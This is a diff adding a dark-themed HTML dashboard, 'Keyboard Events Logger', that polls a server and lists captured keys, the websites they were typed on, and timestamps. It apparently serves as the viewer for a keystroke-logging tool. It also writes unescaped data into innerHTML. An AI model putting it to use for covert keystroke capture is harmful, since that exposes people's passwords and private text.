@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Keyboard Events Logger</title>
+  <style>
+    body {
+      font-family: "Arial", sans-serif;
+      background-color: #000;
+      color: #fff;
+      margin: 0;
+      padding: 0;
+    }
+    header {
+      text-align: center;
+      padding: 1rem;
+      background-color: #111;
+      border-bottom: 1px solid #444;
+    }
+    header h1 {
+      margin: 0;
+      font-size: 1.5rem;
+      letter-spacing: 0.05em;
+    }
+    main {
+      max-width: 800px;
+      margin: 2rem auto;
+      padding: 0 1rem;
+    }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      background-color: #111;
+    }
+    table th, table td {
+      padding: 0.75rem;
+      text-align: left;
+      border: 1px solid #444;
+    }
+    table th {
+      background-color: #222;
+      font-weight: bold;
+    }
+    table tr:nth-child(even) {
+      background-color: #222;
+    }
+    table tr:hover {
+      background-color: #333;
+    }
+    a {
+      color: #0af;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <h1>Keyboard Events Logger</h1>
+  </header>
+  <main>
+    <table id="eventsTable">
+      <thead>
+        <tr>
+          <th>Key</th>
+          <th>Website</th>
+          <th>Timestamp</th>
+        </tr>
+      </thead>
+      <tbody>
+        <!-- Data will be dynamically inserted here -->
+      </tbody>
+    </table>
+  </main>
+  <script>
+    async function fetchEvents() {
+      try {
+        const response = await fetch('/events'); // Fetch the events from the server
+        const events = await response.json(); // Parse JSON response
+        const tbody = document.querySelector('#eventsTable tbody'); // Get the table body
+
+        // Clear the current table content
+        tbody.innerHTML = '';
+
+        // Populate the table with the latest events
+        events.forEach(event => {
+          const row = document.createElement('tr');
+          row.innerHTML = `
+            <td>${event.key}</td>
+            <td><a href="${event.url}" target="_blank">${event.url}</a></td>
+            <td>${event.timestamp}</td>
+          `;
+          tbody.appendChild(row);
+        });
+      } catch (error) {
+        console.error('Error fetching events:', error);
+      }
+    }
+
+    // Fetch events every 2 seconds
+    setInterval(fetchEvents, 2000);
+
+    // Fetch events immediately when the page loads
+    fetchEvents();
+  </script>
+</body>
+</html>
